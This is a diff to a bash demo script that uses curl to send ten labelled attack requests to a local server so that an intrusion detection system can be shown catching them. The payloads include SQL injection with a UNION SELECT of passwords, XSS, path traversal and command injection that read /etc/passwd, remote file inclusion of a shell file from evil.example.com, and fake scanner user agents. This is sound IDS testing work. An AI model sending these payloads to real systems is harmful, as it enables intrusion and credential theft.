@@ -11,13 +11,6 @@
 #      tail -n0 -f /var/log/apache2/access.log | python3 apache_log.py monitor /dev/stdin lof
 #  Terminal 2 (bắn tấn công):
 #      bash demo_ids.sh
-#
-#  ---- TRAFFIC SẠCH (làm riêng: chạy demo_clean.sh) ----
-#  Sau khi model đã được train lại trên dữ liệu single HTTP/1.1, traffic sạch
-#  KHỚP phân phối huấn luyện (GET phân trang / POST form tới '/') KHÔNG bị báo.
-#      bash demo_clean.sh
-#  Lưu ý: traffic tới một app HOÀN TOÀN KHÁC (vd /index.php của app lạ) vẫn có
-#  thể bị báo do domain-shift (giới hạn §5.1) — cần retrain trên log sạch app đó.
 # =====================================================================
 
 BASE=${BASE:-http://localhost}
@@ -25,7 +18,7 @@ DELAY=${DELAY:-1}
 B="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'
 
-req() {  # $1=mô_tả  $2..=curl args
+req() {
     echo -e "$1"
     code=$(curl -s -o /dev/null -w "%{http_code}" "${@:2}")
     echo -e "      ${CYAN}-> HTTP $code${NC}"
@@ -37,12 +30,12 @@ echo -e "${CYAN}🚀 DEMO IDS: 10 traffic attacks to $BASE${NC}"
 req "${RED}1. SQL Injection${NC}"                -A "$B" "$BASE/login.php?user=admin'%20OR%20'1'%3D'1"
 req "${RED}2. Cross-Site Scripting (XSS)${NC}"   -A "$B" "$BASE/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E"
 req "${RED}3. Path Traversal / LFI${NC}"         -A "$B" "$BASE/download.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
-req "${RED}4. Scanner tự động (sqlmap UA)${NC}"  -A "sqlmap/1.5.8.6#dev" "$BASE/products.php?id=1"
+req "${RED}4. Scanner UA (sqlmap UA)${NC}"  -A "sqlmap/1.5.8.6#dev" "$BASE/products.php?id=1"
 req "${RED}5. HTTP Method Tampering (PUT)${NC}"  -X PUT -A "$B" "$BASE/index.php"
 req "${RED}6. Command Injection${NC}"            -A "$B" "$BASE/run.php?cmd=;cat%20/etc/passwd"
 req "${RED}7. Remote File Inclusion (RFI)${NC}"  -A "$B" "$BASE/include.php?page=http://evil.example.com/shell.txt"
 req "${RED}8. Sensitive File Access (.env)${NC}" -A "$B" "$BASE/.env"
-req "${RED}9. Scanner tự động (Nikto UA)${NC}"   -A "Nikto/2.1.6" "$BASE/admin.php"
+req "${RED}9. Scanner UA (Nikto UA)${NC}"   -A "Nikto/2.1.6" "$BASE/admin.php"
 req "${RED}10. SQL Injection (UNION SELECT)${NC}" -A "$B" "$BASE/list.php?id=1%20UNION%20SELECT%20pass%20FROM%20users"
 
 echo -e "${CYAN}✅ DONE: 10 traffics attack to $BASE${NC}"
